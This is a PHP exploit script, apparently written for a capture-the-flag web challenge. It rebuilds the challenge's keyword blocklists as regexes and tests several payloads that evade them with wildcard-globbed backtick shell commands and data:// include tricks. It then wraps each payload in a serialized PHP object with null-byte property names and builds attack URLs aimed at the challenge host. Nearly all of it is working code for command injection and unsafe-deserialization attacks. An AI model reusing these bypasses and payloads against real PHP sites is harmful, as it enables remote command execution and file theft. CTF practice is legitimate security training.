<?php
// 使用echo输出然后exit
$blocked_a = ['eval', 'dl', 'ls', 'p', 'escape', 'er', 'str', 'cat', 'flag', 'file', 'ay', 'or', 'ftp', 'dict', '\.\.', 'h', 'w', 'exec', 's', 'open'];
$blocked_b = ['find', 'filter', 'c', 'pa', 'proc', 'dir', 'regexp', 'n', 'alter', 'load', 'grep', 'o', 'file', 't', 'w', 'insert', 'sort', 'h', 'sy', '\.\.', 'array', 'sh', 'touch', 'e', 'php', 'f'];

$pattern_a = '/' . implode('|', array_map(function ($x) {
    return preg_quote($x, '/'); }, $blocked_a)) . '/i';
$pattern_b = '/' . implode('|', array_map(function ($x) {
    return preg_quote($x, '/'); }, $blocked_b)) . '/i';

echo "=== Strategy: Echo then exit ===\n\n";

echo "Test 1: Direct echo\n";
$a1 = ';$x=`/???/???%20/????`;exit($x);';
$b1 = '//';
echo "a: $a1\n";
echo "b: $b1\n";
echo "a blocked: " . (preg_match($pattern_a, $a1) ? "YES" : "NO") . "\n";
echo "b blocked: " . (preg_match($pattern_b, $b1) ? "YES" : "NO") . "\n\n";

if (!preg_match($pattern_a, $a1) && !preg_match($pattern_b, $b1)) {
    $ser1 = 'O:4:"FLAG":2:{s:7:"' . "\x00" . 'FLAG' . "\x00" . 'a";s:' . strlen($a1) . ':"' . $a1 . '";s:4:"' . "\x00" . '*' . "\x00" . 'b";s:' . strlen($b1) . ':"' . $b1 . '";}';
    $url1 = "http://challenge.bluesharkinfo.com:26344/?exp=" . urlencode($ser1);
    echo "URL1:\n$url1\n\n";
    file_put_contents('url_echo.txt', $url1);
}

echo "Test 2: Using include with visible output\n";
$a2 = ';include("data:text/plain,".`/???/???%20/????`);exit();';
$b2 = '//';
echo "a: $a2\n";
echo "b: $b2\n";
echo "a blocked: " . (preg_match($pattern_a, $a2) ? "YES" : "NO") . "\n";
echo "b blocked: " . (preg_match($pattern_b, $b2) ? "YES (contains t)" : "NO") . "\n\n";

echo "Test 3: Using data:// with plain text\n";
$a3 = ';include("data://,".`/???/???%20/????`);exit();';
$b3 = '//';
echo "a: $a3\n";
echo "b: $b3\n";
echo "a blocked: " . (preg_match($pattern_a, $a3) ? "YES" : "NO") . "\n";
echo "b blocked: " . (preg_match($pattern_b, $b3) ? "YES" : "NO") . "\n\n";

if (!preg_match($pattern_a, $a3) && !preg_match($pattern_b, $b3)) {
    $ser3 = 'O:4:"FLAG":2:{s:7:"' . "\x00" . 'FLAG' . "\x00" . 'a";s:' . strlen($a3) . ':"' . $a3 . '";s:4:"' . "\x00" . '*' . "\x00" . 'b";s:' . strlen($b3) . ':"' . $b3 . '";}';
    $url3 = "http://challenge.bluesharkinfo.com:26344/?exp=" . urlencode($ser3);
    echo "URL3:\n$url3\n\n";
    file_put_contents('url_data2.txt', $url3);
}

echo "Test 4: Output in different way\n";
$a4 = ';@include($_=`/???/???%20/????`);exit($_);';
$b4 = '//';
echo "a: $a4\n";
echo "b: $b4\n";
echo "a blocked: " . (preg_match($pattern_a, $a4) ? "YES" : "NO") . "\n";
echo "b blocked: " . (preg_match($pattern_b, $b4) ? "YES" : "NO") . "\n\n";

if (!preg_match($pattern_a, $a4) && !preg_match($pattern_b, $b4)) {
    $ser4 = 'O:4:"FLAG":2:{s:7:"' . "\x00" . 'FLAG' . "\x00" . 'a";s:' . strlen($a4) . ':"' . $a4 . '";s:4:"' . "\x00" . '*' . "\x00" . 'b";s:' . strlen($b4) . ':"' . $b4 . '";}';
    $url4 = "http://challenge.bluesharkinfo.com:26344/?exp=" . urlencode($ser4);
    echo "URL4:\n$url4\n\n";
    file_put_contents('url_final2.txt', $url4);
}
